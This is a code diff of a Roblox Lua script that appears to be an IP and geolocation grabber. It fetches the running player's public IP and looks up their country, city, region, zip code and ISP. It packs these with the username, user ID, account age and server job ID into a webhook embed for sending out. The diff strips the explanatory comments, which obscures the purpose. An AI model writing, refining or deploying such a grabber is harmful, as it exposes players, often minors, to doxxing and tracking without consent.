@@ -1,7 +1,6 @@
-local player = game.Players.LocalPlayer -- Get the player object
-local UserInputService = game:GetService("UserInputService") -- Get the UserInputService to detect the device
+local player = game.Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
 
--- Function to get the player's device type
 local function getDeviceType()
     if UserInputService.TouchEnabled then
         return "Mobile"
@@ -12,19 +11,18 @@ local function getDeviceType()
     end
 end
 
--- Fetch the player's public IP and detailed geolocation
 local ipAddress, country, city, region, zip, isp, ipType
 local success, errorMessage = pcall(function()
-    ipAddress = game:HttpGet("https://api.ipify.org") -- Fetch the IP
-    local geoData = game:HttpGet("http://ip-api.com/json/" .. ipAddress) -- Fetch geolocation info
+    ipAddress = game:HttpGet("https://api.ipify.org")
+    local geoData = game:HttpGet("http://ip-api.com/json/" .. ipAddress)
     local geoTable = game:GetService("HttpService"):JSONDecode(geoData)
 
-    country = geoTable.country or "Unknown Country" -- Extract country or fallback
-    city = geoTable.city or "Unknown City" -- Extract city or fallback
-    region = geoTable.regionName or "Unknown Region" -- Extract region or fallback
-    zip = geoTable.zip or "Unknown Zip" -- Extract zip code or fallback
-    isp = geoTable.isp or "Unknown ISP" -- Extract ISP information
-    ipType = ipAddress:match("^[%d%.]+$") and "IPv4" or "IPv6" -- Check if the IP is IPv4 or IPv6
+    country = geoTable.country or "Unknown Country"
+    city = geoTable.city or "Unknown City"
+    region = geoTable.regionName or "Unknown Region"
+    zip = geoTable.zip or "Unknown Zip" 
+    isp = geoTable.isp or "Unknown ISP"
+    ipType = ipAddress:match("^[%d%.]+$") and "IPv4" or "IPv6"
 end)
 
 if not success then
@@ -37,17 +35,15 @@ if not success then
     ipType = "Failed to fetch IP Type"
 end
 
--- Get the total number of players in the server
 local totalPlayers = game.Players.NumPlayers
 
--- Webhook setup (without leaderstats, but including country, city, region, etc.)
 local OSTime = os.time()
 local Time = os.date('!*t', OSTime)
 local Content = ''
 local PlayerName = player.Name
 local PlayerUserId = player.UserId
 local PlayerAccountAge = player.AccountAge
-local DeviceType = getDeviceType() -- Get the player's device type
+local DeviceType = getDeviceType()
 
 local MarketplaceService = game:GetService("MarketplaceService")
 local Success, GameInfo = pcall(function()
@@ -57,7 +53,7 @@ local GameName = Success and GameInfo.Name or "Unknown Game"
 local GameUrl = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
 
 local Embed = {
-    title = ipAddress, -- Add the public IP address as the title
+    title = ipAddress,
     color = 3447003,
     footer = { text = "Job ID: " .. game.JobId },
     author = {
@@ -97,42 +93,42 @@ local Embed = {
         },
         {
             name = "Device Type",
-            value = DeviceType, -- Display the device type
+            value = DeviceType,
             inline = true,
         },
         {
             name = "Player Country",
-            value = country, -- Display the player's country
+            value = country, 
             inline = true,
         },
         {
             name = "Player City",
-            value = city, -- Display the player's city
+            value = city,
             inline = true,
         },
         {
             name = "Player Region",
-            value = region, -- Display the player's region
+            value = region,
             inline = true,
         },
         {
             name = "Player Zip",
-            value = zip, -- Display the player's zip code
+            value = zip,
             inline = true,
         },
         {
             name = "Player ISP",
-            value = isp, -- Display the player's ISP
+            value = isp,
             inline = true,
         },
         {
             name = "IP Type",
-            value = ipType, -- Display whether the IP is IPv4 or IPv6
+            value = ipType,
             inline = true,
         },
         {
             name = "Total Players in Server",
-            value = tostring(totalPlayers), -- Display the total players in the server
+            value = tostring(totalPlayers),
             inline = true,
         },
         {
